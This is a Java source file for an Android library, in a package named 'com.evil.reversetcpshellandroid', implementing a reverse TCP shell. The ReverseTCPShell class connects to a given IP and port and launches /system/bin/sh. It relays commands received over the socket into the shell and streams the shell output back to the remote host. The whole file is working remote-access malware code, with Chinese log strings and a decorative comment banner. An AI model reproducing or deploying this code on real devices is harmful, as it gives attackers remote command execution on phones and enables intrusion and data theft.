package com.evil.reversetcpshellandroid.library;

import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.util.Log;

import org.reactivestreams.Publisher;
import org.reactivestreams.Subscriber;
import org.reactivestreams.Subscription;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.Executor;

import io.reactivex.BackpressureStrategy;
import io.reactivex.Flowable;
import io.reactivex.FlowableEmitter;
import io.reactivex.FlowableOnSubscribe;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Consumer;
import io.reactivex.internal.functions.Functions;
import io.reactivex.schedulers.Schedulers;
import io.reactivex.subscribers.DefaultSubscriber;
import io.reactivex.subscribers.ResourceSubscriber;

/**
 * Created by LongYH on 2017/6/7.
 * #     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   #
 * #                       _oo0oo_                     #
 * #                      o8888888o                    #
 * #                      88" . "88                    #
 * #                      (| -_- |)                    #
 * #                      0\  =  /0                    #
 * #                    ___/`---'\___                  #
 * #                  .' \\|     |# '.                 #
 * #                 / \\|||  :  |||# \                #
 * #                / _||||| -:- |||||- \              #
 * #               |   | \\\  -  #/ |   |              #
 * #               | \_|  ''\---/''  |_/ |             #
 * #               \  .-\__  '-'  ___/-. /             #
 * #             ___'. .'  /--.--\  `. .'___           #
 * #          ."" '<  `.___\_<|>_/___.' >' "".         #
 * #         | | :  `- \`.;`\ _ /`;.`/ - ` : | |       #
 * #         \  \ `_.   \_ __\ /__ _/   .-` /  /       #
 * #     =====`-.____`.___ \_____/___.-`___.-'=====    #
 * #                       `=---='                     #
 * #     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   #
 * #                                                   #
 * #               佛祖保佑         永无BUG            #
 * #                                                   #
 */

public class ReverseTCPShell {
    private static final String TAG = ReverseTCPShell.class.getSimpleName();
    private static final int ERROR = -1;
    private static final int CONNECTED = 1;
    private static final int RECEIVE = 2;
    private static final int FEEDBACK = 3;
    private static final int STOP = 4;

    private boolean alive = true;
    private String ip;
    private int port;
    private Socket socket;
    private PrintWriter socketWriter;
    private BufferedReader socketReader;
    private ConnectErrorListener errorListener;
    private ConnectListener connectListener;

    private PrintWriter commandWriter;
    private BufferedReader commandReader;

    private TypicalSubscriber feedBackSubscriber;
    private TypicalSubscriber receiveSubscriber;

    private ReverseTCPShell() {
        super();
    }

    private ReverseTCPShell(String ip, int port) {
        this();
        this.ip = ip;
        this.port = port;
    }

    public static void connect(String ip, int port, ConnectListener connectListener, final ConnectErrorListener errorListener) {
        final ReverseTCPShell tcpShell = new ReverseTCPShell(ip, port);
        tcpShell.errorListener = errorListener;
        tcpShell.connectListener = connectListener;
        tcpShell.connect();
    }


    private void connect() {
        Flowable.create(new FlowableOnSubscribe<Object>() {
            @Override
            public void subscribe(FlowableEmitter<Object> e) throws Exception {
                Log.d(TAG, "尝试连接服务器:" + ip + ":" + port);
                socket = new Socket(ip, port);
                socketWriter = new PrintWriter(socket.getOutputStream(), true);
                socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                socketWriter.println("---Connection has been established---");
                socketWriter.flush();
                Log.d(TAG, "与服务器连接成功");
                e.onNext("");
            }
        }, BackpressureStrategy.BUFFER)
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new ResourceSubscriber<Object>() {
                    @Override
                    public void onNext(Object o) {
                        //开启监听
                        startFeedBackThread();
                        startReceiveThread();
                        connectListener.connected(ReverseTCPShell.this);
                    }

                    @Override
                    public void onError(Throwable t) {
                        errorListener.error(t.getMessage());
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void startFeedBackThread() {
        feedBackSubscriber = new TypicalSubscriber<String>() {
            @Override
            public void onNext(String s) {
                connectListener.feedbackMessage(s);
            }

            @Override
            public void onError(Throwable t) {
                connectStopped();
            }

            @Override
            public void onComplete() {
                connectStopped();
            }
        };
        Flowable.create(new FlowableOnSubscribe<String>() {
            @Override
            public void subscribe(FlowableEmitter<String> e) throws Exception {
                Runtime rt = Runtime.getRuntime();
                Process p = rt.exec("/system/bin/sh");

                InputStream IS = p.getInputStream();
                OutputStream OS = p.getOutputStream();
                commandWriter = new PrintWriter(OS);
                commandReader = new BufferedReader(new InputStreamReader(IS));

                String line = "";
                while ((line = commandReader.readLine()) != null) {
                    socketWriter.println(line);
                    socketWriter.flush();
                    e.onNext(line);
                }
                p.destroy();
                e.onComplete();
            }
        }, BackpressureStrategy.BUFFER)
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread()).subscribe(feedBackSubscriber);
    }

    public void startReceiveThread() {
        receiveSubscriber = new TypicalSubscriber<String>() {
            @Override
            public void onNext(String s) {
                connectListener.receiveMessage(s);
            }

            @Override
            public void onError(Throwable t) {
                connectStopped();
            }

            @Override
            public void onComplete() {
                connectStopped();
            }
        };
        Flowable.create(new FlowableOnSubscribe<String>() {
            @Override
            public void subscribe(FlowableEmitter<String> e) throws Exception {
                String receive;
                while ((receive = socketReader.readLine()) != null) {
                    if (commandWriter != null) {
                        commandWriter.println(receive);
                        commandWriter.flush();
                        e.onNext(receive);
                    }
                }
                e.onComplete();
            }
        }, BackpressureStrategy.BUFFER)
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread()).subscribe(receiveSubscriber);
    }


    private void connectStopped() {
        try {
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        alive = false;
        connectListener.stopped();
    }


    synchronized public void stop() {
        if (alive)
            connectStopped();
    }

}
